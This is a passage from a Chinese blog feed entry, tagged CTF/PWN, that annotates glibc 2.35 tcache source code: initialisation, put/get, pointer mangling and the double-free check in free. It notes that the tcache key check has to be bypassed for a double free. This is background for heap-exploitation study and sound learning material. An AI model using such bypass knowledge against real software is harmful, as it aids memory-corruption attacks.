class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个线程都会被分配一个<code>TcacheBin</code>数组，数组大小为64，也就是每个TcacheBin里会有64个<code>bin</code>单向链表，每个bin最多可以缓存7个相同大小的空闲<code>chunk</code>。chunk在64位机器以16字节递增，从32到1024(<code>MAX_TCACHE_COUNT</code>)字节。在32位机器上以8字节递增，从12到512字节。TcacheBin由<code>tcache_perthread_struct</code>结构体维护，大小是0x290，放在堆头；<code>counts</code>数组记录了每个bin上chunk的数量，<code>entries</code>数组记录每个bin的地址。<br><code>tcache_entry</code>结构体用来连接空闲的chunk结构体形成链表。在这里有几个需要注意的问题，其一是<code>next</code>指针指向的是同一个bin中下一个chunk（大小一定相同的chunk）的<code>user_data</code>处（也就是mem），而在fastbin中chunk的fd指针的是下一个chunk的头部，即<code>prev_size</code>处；其二是<code>key</code>是为了防止double free而从glibc2.29才开始加入的，在glibc2.34前key是指向TcacheBin的指针，储存在空闲chunk的bk位置上，而2.34之后的key是由<code>tcache_key_initialize</code>函数生成的，一个线程生成一个key。</p><p><code>tidx2usize(idx)</code>通过bin索引计算chunk大小<br><code>csize2tidx(x)</code>通过chunk大小找到相应的bin索引<br><code>usize2tidx(x)</code>通过用户的需求size计算相应的bin索引</p><p>TcacheBin有很多特性和FastBin很像，LIFO的单向链表结构，PREV_INUSE标志位不清零，严格限制每个bin内chunk的大小相同，且chunk没法在tcachebin内合并。</p><h3 id="TcacheBin初始化"><a href="#TcacheBin初始化" class="headerlink" title="TcacheBin初始化"></a>TcacheBin初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">//分配内存给tcache_perthread_struct</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) <span class="comment">//如果分配失败则尝试再分配一次</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex); <span class="comment">//释放一个互斥锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="comment">/* 在内存不足的情况下，我们可能无法分配内存 -这样的话，我们稍后再试。(๑ゝڡ◕๑) */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin释放"><a href="#TcacheBin释放" class="headerlink" title="TcacheBin释放"></a>TcacheBin释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>; <span class="comment">//将TcacheBin堆头置空</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i]; <span class="comment">//释放每一个bin</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp); <span class="comment">//释放临时堆头</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin存取chunk"><a href="#TcacheBin存取chunk" class="headerlink" title="TcacheBin存取chunk"></a>TcacheBin存取chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//空闲chunk存入tcachebin</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key; <span class="comment">//防止double free的key</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="comment">//将当前bin头部chunk的指针赋给next</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e; <span class="comment">//将这个chunk存进相应索引的bin链表头部（更新bin头部）</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//chunk计数器+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span> <span class="comment">//从tcachebin取出chunk</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx]; <span class="comment">//根据计算好的索引取出链表头部的chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next); <span class="comment">//将头部地址改成下一个chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//计数器-1</span></span><br><span class="line">  e-&gt;key = <span class="number">0</span>; <span class="comment">//key位置置空</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当chunk进入tcachebin时，它会被赋予这个TcacheBin的key，意味着这个chunk<strong>已经加入tcachebin了</strong>，当我们想要进行double free时，free会检查这个key是否存在，存在则说明double free了，所以要想办法绕过key的检查。而在2.28版本之前想进行double free是相当方便的，可以直接连续free。</p><p>这里还有一个问题：可以注意到在维护next成员的时候用了一个叫做<code>PROTECT_PTR</code>的函数，在维护entries的时候有一个<code>REVEAL_PTR</code>函数。我们对它们进行溯源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>发现tcache对fd进行了一定的位运算后才存到chunk上，来当做一个简单的加密。这是从2.32版本才开始引入的机制（但是感觉有点掩耳盗铃的意思）。</p><h3 id="执行free的时候TcacheBin对chunk的检查机制"><a href="#执行free的时候TcacheBin对chunk的检查机制" class="headerlink" title="执行free的时候TcacheBin对chunk的检查机制"></a>执行free的时候TcacheBin对chunk的检查机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp))) <span class="comment">//对chunk对齐的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e) <span class="comment">//对double free的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//bin没满</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>不难发现，tcache虽然检查较少，但是相对于低版本，高版本会对double free和chunk对齐进行检查。</p><h3 id="Stashing机制"><a href="#Stashing机制" class="headerlink" title="Stashing机制"></a>Stashing机制</h3><p>见另一篇文章</p><p>参考阅读：<br>- <a href="https://blog.csdn.net/Tokameine/article/details/119458425">关于如何理解Glibc堆管理器(Ⅶ——Tcache Bins!!)</a><br>- <a href="https://www.freebuf.com/articles/system/291760.html">TcacheBin的相关知识以及漏洞利用</a><br>- <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source">glibc源码在线阅读</a><br>- <a href="https://ftp.gnu.org/pub/gnu/glibc/">glibc源码下载</a></p>]]></content>
    
    
    <summary type="html">glibc_2.35（版本较高，注意版本区别）</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.github.io/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="CTF" scheme="https://c-lby.github.io/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.github.io/tags/PWN/"/>
    
    <category term="heap" scheme="https://c-lby.github.io/tags/heap/"/>
    
  </entry>
  
</feed>
